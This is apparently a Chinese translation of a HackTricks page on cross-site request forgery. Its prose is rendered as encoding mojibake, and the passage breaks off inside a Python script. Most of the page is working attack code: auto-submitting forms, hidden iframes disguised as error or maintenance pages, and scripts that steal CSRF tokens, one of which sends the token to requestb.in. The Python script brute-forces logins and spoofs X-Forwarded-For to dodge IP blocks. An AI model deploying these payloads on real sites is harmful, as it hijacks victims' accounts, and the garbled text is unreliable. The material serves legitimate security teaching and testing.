# CSRF (è·¨ç«™è¯·æ±‚ä¼ªé€ )

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks** ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢æ´å¯Ÿ**\
æ·±å…¥äº†è§£é»‘å®¢çš„åˆºæ¿€å’ŒæŒ‘æˆ˜

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œæ´å¯Ÿï¼Œè·Ÿä¸Šå¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°å‘å¸ƒçš„æ¼æ´èµé‡‘å’Œå…³é”®å¹³å°æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy) å¹¶å¼€å§‹ä¸é¡¶å°–é»‘å®¢åˆä½œï¼

## ä»€ä¹ˆæ˜¯CSRFï¼Ÿ

**è·¨ç«™è¯·æ±‚ä¼ªé€ **ï¼ˆä¹Ÿç§°ä¸ºCSRFï¼‰æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…**è¯±å¯¼ç”¨æˆ·æ‰§è¡Œä»–ä»¬æ— æ„è¿›è¡Œçš„æ“ä½œ**ã€‚\
è¿™æ˜¯é€šè¿‡**è®©å·²ç™»å½•ç”¨æˆ·**åœ¨å—å®³å¹³å°è®¿é—®æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ï¼Œå¹¶ä»é‚£é‡Œ**æ‰§è¡Œ**æ¶æ„JSä»£ç ã€å‘é€è¡¨å•æˆ–æ£€ç´¢â€œå›¾ç‰‡â€åˆ°**å—å®³è€…è´¦æˆ·**æ¥å®Œæˆçš„ã€‚

### å…ˆå†³æ¡ä»¶

ä¸ºäº†èƒ½å¤Ÿåˆ©ç”¨CSRFæ¼æ´ï¼Œä½ é¦–å…ˆéœ€è¦**æ‰¾åˆ°ä¸€ä¸ªç›¸å…³çš„æ“ä½œæ¥æ»¥ç”¨**ï¼ˆæ›´æ”¹å¯†ç æˆ–ç”µå­é‚®ä»¶ï¼Œè®©å—å®³è€…åœ¨ç¤¾äº¤ç½‘ç»œä¸Šå…³æ³¨ä½ ï¼Œç»™ä½ æ›´å¤šæƒé™...ï¼‰ã€‚**ä¼šè¯å¿…é¡»ä»…ä¾èµ–äºcookiesæˆ–HTTPåŸºæœ¬è®¤è¯å¤´**ï¼Œä»»ä½•å…¶ä»–å¤´ä¸èƒ½ç”¨æ¥å¤„ç†ä¼šè¯ã€‚æœ€åï¼Œè¯·æ±‚ä¸­**ä¸åº”è¯¥æœ‰ä¸å¯é¢„æµ‹çš„å‚æ•°**ã€‚

å¯èƒ½æœ‰å‡ ç§**é˜²å¾¡æªæ–½**å¯ä»¥é¿å…è¿™ç§æ¼æ´ã€‚

### **å¸¸è§é˜²å¾¡**

* [**SameSite cookies**](hacking-with-cookies/#samesite)ï¼šå¦‚æœä¼šè¯cookieä½¿ç”¨äº†è¿™ä¸ªæ ‡å¿—ï¼Œä½ å¯èƒ½æ— æ³•ä»ä»»æ„ç½‘ç«™å‘é€cookieã€‚
* [**è·¨æºèµ„æºå…±äº«**](cors-bypass.md)ï¼šæ ¹æ®ä½ éœ€è¦æ‰§è¡Œçš„HTTPè¯·æ±‚ç±»å‹æ¥æ»¥ç”¨ç›¸å…³æ“ä½œï¼Œä½ å¯èƒ½éœ€è¦è€ƒè™‘**å—å®³ç«™ç‚¹çš„CORSç­–ç•¥**ã€‚_æ³¨æ„ï¼Œå¦‚æœä½ åªæ˜¯æƒ³å‘é€ä¸€ä¸ªGETè¯·æ±‚æˆ–ä¸€ä¸ªæ¥è‡ªè¡¨å•çš„POSTè¯·æ±‚ï¼Œå¹¶ä¸”ä½ ä¸éœ€è¦è¯»å–å“åº”ï¼Œé‚£ä¹ˆCORSç­–ç•¥ä¸ä¼šæœ‰å½±å“ã€‚_
* è¦æ±‚ç”¨æˆ·è¾“å…¥**å¯†ç **ä»¥æˆæƒæ“ä½œã€‚
* è§£å†³ä¸€ä¸ª**éªŒè¯ç **ã€‚
* è¯»å–**Referrer**æˆ–**Origin**å¤´ã€‚å¦‚æœä½¿ç”¨äº†æ­£åˆ™è¡¨è¾¾å¼ï¼Œå®ƒå¯èƒ½è¢«ç»•è¿‡ï¼Œä¾‹å¦‚ä½¿ç”¨ï¼š
  * http://mal.net?orig=http://example.com (ä»¥urlç»“å°¾)
  * http://example.com.mal.net (ä»¥urlå¼€å¤´)
* **ä¿®æ”¹** Postæˆ–Getè¯·æ±‚çš„**å‚æ•°**çš„**åç§°**
* åœ¨æ¯ä¸ªä¼šè¯ä¸­ä½¿ç”¨**CSRFä»¤ç‰Œ**ã€‚è¿™ä¸ªä»¤ç‰Œå¿…é¡»åœ¨è¯·æ±‚ä¸­å‘é€ä»¥ç¡®è®¤æ“ä½œã€‚è¿™ä¸ªä»¤ç‰Œå¯ä»¥ç”¨CORSä¿æŠ¤ã€‚

### CSRFå›¾è°±

![](<../.gitbook/assets/image (112).png>)

## ç»•è¿‡é˜²å¾¡

### ä»POSTåˆ°GET

ä¹Ÿè®¸ä½ æƒ³æ»¥ç”¨çš„è¡¨å•å‡†å¤‡å‘é€ä¸€ä¸ªå¸¦æœ‰CSRFä»¤ç‰Œçš„**POSTè¯·æ±‚**ï¼Œä½†æ˜¯ï¼Œä½ åº”è¯¥**æ£€æŸ¥**æ˜¯å¦ä¸€ä¸ª**GET**ä¹Ÿæ˜¯**æœ‰æ•ˆçš„**ï¼Œå¹¶ä¸”å½“ä½ å‘é€ä¸€ä¸ªGETè¯·æ±‚æ—¶ï¼Œ**CSRFä»¤ç‰Œæ˜¯å¦ä»åœ¨éªŒè¯**ã€‚

### ç¼ºå°‘ä»¤ç‰Œ

ä¸€äº›åº”ç”¨ç¨‹åºåœ¨ä»¤ç‰Œå­˜åœ¨æ—¶æ­£ç¡®**éªŒè¯ä»¤ç‰Œï¼Œä½†å¦‚æœä»¤ç‰Œè¢«çœç•¥åˆ™è·³è¿‡éªŒè¯**ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥**ç§»é™¤åŒ…å«ä»¤ç‰Œçš„æ•´ä¸ªå‚æ•°**ï¼ˆä¸ä»…ä»…æ˜¯å®ƒçš„å€¼ï¼‰ï¼Œä»¥ç»•è¿‡éªŒè¯å¹¶å‘èµ·CSRFæ”»å‡»ã€‚

### CSRFä»¤ç‰Œæœªä¸ç”¨æˆ·ä¼šè¯ç»‘å®š

ä¸€äº›åº”ç”¨ç¨‹åº**ä¸éªŒè¯ä»¤ç‰Œæ˜¯å¦å±äºå‘å‡ºè¯·æ±‚çš„åŒä¸€ä¼šè¯**ã€‚ç›¸åï¼Œåº”ç”¨ç¨‹åº**ç»´æŠ¤ä¸€ä¸ªå®ƒå‘å‡ºçš„ä»¤ç‰Œçš„å…¨å±€æ± **ï¼Œå¹¶æ¥å—å‡ºç°åœ¨è¿™ä¸ªæ± ä¸­çš„ä»»ä½•ä»¤ç‰Œã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è‡ªå·±çš„è´¦æˆ·ç™»å½•åº”ç”¨ç¨‹åºï¼Œ**è·å–ä¸€ä¸ªæœ‰æ•ˆçš„ä»¤ç‰Œ**ï¼Œç„¶åå°†è¯¥ä»¤ç‰Œ**æä¾›ç»™å—å®³è€…**ç”¨æˆ·åœ¨ä»–ä»¬çš„CSRFæ”»å‡»ä¸­ã€‚

### æ–¹æ³•ç»•è¿‡

å¦‚æœè¯·æ±‚ä½¿ç”¨äº†ä¸€ä¸ªâ€œ**å¥‡æ€ªçš„**â€**æ–¹æ³•**ï¼Œæ£€æŸ¥**æ–¹æ³•è¦†ç›–åŠŸèƒ½**æ˜¯å¦æœ‰æ•ˆã€‚\
ä¾‹å¦‚ï¼Œå¦‚æœå®ƒ**ä½¿ç”¨PUT**æ–¹æ³•ï¼Œä½ å¯ä»¥å°è¯•**ä½¿ç”¨POST**æ–¹æ³•å¹¶**å‘é€**ï¼š_https://example.com/my/dear/api/val/num?**\_method=PUT**_

è¿™ä¹Ÿå¯ä»¥é€šè¿‡åœ¨POSTè¯·æ±‚ä¸­å‘é€**\_methodå‚æ•°**æˆ–ä½¿ç”¨**å¤´**æ¥å®ç°ï¼š

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### è‡ªå®šä¹‰å¤´ä»¤ç‰Œç»•è¿‡

å¦‚æœè¯·æ±‚åœ¨ä½œä¸º**CSRFä¿æŠ¤æ–¹æ³•**å‘è¯·æ±‚æ·»åŠ äº†ä¸€ä¸ªå¸¦æœ‰**ä»¤ç‰Œ**çš„**è‡ªå®šä¹‰å¤´**ï¼Œé‚£ä¹ˆï¼š

* æµ‹è¯•æ²¡æœ‰**è‡ªå®šä¹‰ä»¤ç‰Œå’Œå¤´**çš„è¯·æ±‚ã€‚
* æµ‹è¯•ä¸**ä»¤ç‰Œå®Œå…¨ç›¸åŒé•¿åº¦ä½†ä¸åŒä»¤ç‰Œ**çš„è¯·æ±‚ã€‚

### CSRFä»¤ç‰Œé€šè¿‡cookieéªŒè¯

åœ¨å‰é¢çš„æ¼æ´ä¸Šçš„å¦ä¸€ä¸ªå˜ç§ä¸­ï¼Œä¸€äº›åº”ç”¨ç¨‹åº**åœ¨cookieå’Œè¯·æ±‚å‚æ•°ä¸­å¤åˆ¶æ¯ä¸ªä»¤ç‰Œ**ã€‚æˆ–è€…**è®¾ç½®ä¸€ä¸ªcsrf cookie**ï¼Œç„¶ååœ¨åç«¯**æ£€æŸ¥å‘é€çš„csrfä»¤ç‰Œæ˜¯å¦ä¸cookieç›¸å…³**ã€‚

å½“åç»­è¯·æ±‚è¢«éªŒè¯æ—¶ï¼Œåº”ç”¨ç¨‹åºç®€å•åœ°éªŒè¯**è¯·æ±‚å‚æ•°ä¸­æäº¤çš„ä»¤ç‰Œæ˜¯å¦ä¸cookieå­˜å‚¨çš„å€¼åŒ¹é…**ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœç½‘ç«™åŒ…å«ä»»ä½•å¯èƒ½å…è®¸ä»–å°†CSRF cookieè®¾ç½®ç»™å—å®³è€…çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥å†æ¬¡æ‰§è¡ŒCSRF**æ”»å‡»**ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥å°è¯•åŠ è½½å‡å›¾åƒæ¥è®¾ç½®cookieï¼Œç„¶ååƒè¿™ä¸ªä¾‹å­ä¸­é‚£æ ·å‘èµ·CSRFæ”»å‡»ï¼š
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¦‚æœ**csrf ä»¤ç‰Œä¸ä¼šè¯ cookie ç›¸å…³è”ï¼Œè¿™ç§æ”»å‡»å°†ä¸èµ·ä½œç”¨**ï¼Œå› ä¸ºæ‚¨éœ€è¦å°†æ‚¨çš„ä¼šè¯è®¾ç½®ç»™å—å®³è€…ï¼Œå› æ­¤æ‚¨å°†ä¼šæ”»å‡»è‡ªå·±ã€‚
{% endhint %}

### æ›´æ”¹ Content-Type

æ ¹æ®[**æ­¤å¤„**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)çš„è¯´æ˜ï¼Œä¸ºäº†**é¿å…ä½¿ç”¨ POST æ–¹æ³•çš„é¢„æ£€**è¯·æ±‚ï¼Œä»¥ä¸‹æ˜¯å…è®¸çš„ Content-Type å€¼ï¼š

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

ä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼Œ**æœåŠ¡å™¨é€»è¾‘å¯èƒ½ä¼šæ ¹æ®ä½¿ç”¨çš„ Content-Type è€Œæœ‰æ‰€ä¸åŒ**ï¼Œå› æ­¤æ‚¨åº”è¯¥å°è¯•ä¸Šè¿°æåˆ°çš„å€¼ä»¥åŠå…¶ä»–å€¼ï¼Œå¦‚ **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

ä»¥ä¸‹æ˜¯å°† JSON æ•°æ®ä½œä¸º text/plain å‘é€çš„ç¤ºä¾‹ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://brycec.me/posts/corctf\_2021\_challenges)ï¼‰ï¼š
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### application/json é¢„æ£€è¯·æ±‚ç»•è¿‡

å¦‚æ‚¨æ‰€çŸ¥ï¼Œæ‚¨ä¸èƒ½é€šè¿‡ HTML è¡¨å•å‘é€å¸¦æœ‰ **`application/json`** Content-Type çš„ POST è¯·æ±‚ï¼Œå¦‚æœæ‚¨å°è¯•é€šè¿‡ **`XMLHttpRequest`** å‘é€ï¼Œä¼šé¦–å…ˆå‘é€ä¸€ä¸ª **é¢„æ£€** è¯·æ±‚ã€‚\
ç„¶è€Œï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨å†…å®¹ç±»å‹ **`text/plain` å’Œ `application/x-www-form-urlencoded`** å‘é€ JSON æ•°æ®ï¼Œåªæ˜¯ä¸ºäº†æ£€æŸ¥åç«¯æ˜¯å¦ç‹¬ç«‹äº Content-Type ä½¿ç”¨æ•°æ®ã€‚\
æ‚¨å¯ä»¥é€šè¿‡è®¾ç½® **`enctype="text/plain"`** å‘é€ä¸€ä¸ªä½¿ç”¨ `Content-Type: text/plain` çš„è¡¨å•ã€‚

å¦‚æœæœåŠ¡å™¨åªæ¥å— "application/json" å†…å®¹ç±»å‹ï¼Œæ‚¨å¯ä»¥ **å‘é€å†…å®¹ç±»å‹ "text/plain; application/json"** è€Œä¸è§¦å‘é¢„æ£€è¯·æ±‚ã€‚

æ‚¨è¿˜å¯ä»¥å°è¯•é€šè¿‡ä½¿ç”¨ **SWF flash æ–‡ä»¶** æ¥ **ç»•è¿‡** æ­¤é™åˆ¶ã€‚æ›´å¤šä¿¡æ¯è¯·[**é˜…è¯»è¿™ç¯‡æ–‡ç« **](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)ã€‚

### Referrer / Origin æ£€æŸ¥ç»•è¿‡

**é¿å… Referrer å¤´**

ä¸€äº›åº”ç”¨ç¨‹åºåœ¨è¯·æ±‚ä¸­å­˜åœ¨ Referer å¤´æ—¶ä¼šéªŒè¯å®ƒï¼Œä½†å¦‚æœçœç•¥è¯¥å¤´ï¼Œåˆ™**è·³è¿‡éªŒè¯**ã€‚
```markup
<meta name="referrer" content="never">
```
**æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

è¦åœ¨Referrerå°†è¦åœ¨å‚æ•°ä¸­å‘é€çš„URLä¸­è®¾ç½®æœåŠ¡å™¨çš„åŸŸåï¼Œæ‚¨å¯ä»¥æ‰§è¡Œï¼š
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEADæ–¹æ³•ç»•è¿‡**

[**æ­¤CTFå†™upçš„**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution)ç¬¬ä¸€éƒ¨åˆ†è§£é‡Šäº†[Oakçš„æºä»£ç ](https://github.com/oakserver/oak/blob/main/router.ts#L281)ï¼Œä¸€ä¸ªè·¯ç”±å™¨è¢«è®¾ç½®ä¸º**å°†HEADè¯·æ±‚ä½œä¸ºGETè¯·æ±‚å¤„ç†**ï¼Œæ²¡æœ‰å“åº”ä½“ - è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„è§£å†³æ–¹æ³•ï¼Œå¹¶ä¸æ˜¯Oakç‹¬æœ‰çš„ã€‚å®ƒä»¬æ²¡æœ‰ä¸€ä¸ªä¸“é—¨å¤„ç†HEADè¯·æ±‚çš„å¤„ç†å™¨ï¼Œè€Œæ˜¯ç®€å•åœ°**äº¤ç»™GETå¤„ç†å™¨ï¼Œä½†åº”ç”¨ç¨‹åºä¼šåˆ é™¤å“åº”ä½“**ã€‚

å› æ­¤ï¼Œå¦‚æœGETè¯·æ±‚å—åˆ°é™åˆ¶ï¼Œä½ å¯ä»¥**å‘é€ä¸€ä¸ªHEADè¯·æ±‚ï¼Œå®ƒå°†ä½œä¸ºGETè¯·æ±‚å¤„ç†**ã€‚

## **åˆ©ç”¨ç¤ºä¾‹**

### **çªƒå–CSRFä»¤ç‰Œ**

å¦‚æœæ­£åœ¨ä½¿ç”¨**CSRFä»¤ç‰Œ**ä½œä¸º**é˜²å¾¡**ï¼Œä½ å¯ä»¥å°è¯•åˆ©ç”¨[**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens)æ¼æ´æˆ–[**æ‚¬æŒ‚æ ‡è®°**](dangling-markup-html-scriptless-injection/)æ¼æ´æ¥**çªƒå–å®ƒ**ã€‚

### **ä½¿ç”¨HTMLæ ‡ç­¾çš„GET**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
å…¶ä»–å¯ç”¨äºè‡ªåŠ¨å‘é€ GET è¯·æ±‚çš„ HTML5 æ ‡ç­¾åŒ…æ‹¬ï¼š

![](<../.gitbook/assets/image (530).png>)

### è¡¨å• GET è¯·æ±‚
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### è¡¨å• POST è¯·æ±‚
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### é€šè¿‡iframeçš„è¡¨å•POSTè¯·æ±‚
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST è¯·æ±‚**
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST è¯·æ±‚
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST è¯·æ±‚ v2
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### åœ¨iframeä¸­å‘èµ·è¡¨å•POSTè¯·æ±‚
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **çªƒå–CSRFä»¤ç‰Œå¹¶å‘é€POSTè¯·æ±‚**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **çªƒå–CSRFä»¤ç‰Œå¹¶ä½¿ç”¨iframeã€è¡¨å•å’ŒAjaxå‘é€Postè¯·æ±‚**
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **çªƒå–CSRFä»¤ç‰Œå¹¶ä½¿ç”¨iframeå’Œè¡¨å•å‘é€POSTè¯·æ±‚**
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **åˆ©ç”¨ä¸¤ä¸ªiframeçªƒå–ä»¤ç‰Œå¹¶å‘é€**
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **ä½¿ç”¨Ajaxçªƒå–CSRFä»¤ç‰Œå¹¶é€šè¿‡è¡¨å•å‘é€POSTè¯·æ±‚**
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### ä½¿ç”¨ Socket.IO çš„ CSRF
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF ç™»å½•æš´åŠ›ç ´è§£

ä»¥ä¸‹ä»£ç å¯ç”¨äºå¯¹å¸¦æœ‰ CSRF ä»¤ç‰Œçš„ç™»å½•è¡¨å•è¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆå®ƒè¿˜ä½¿ç”¨äº† X-Forwarded-For å¤´éƒ¨å°è¯•ç»•è¿‡å¯èƒ½çš„ IP é»‘åå•ï¼‰ï¼š
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
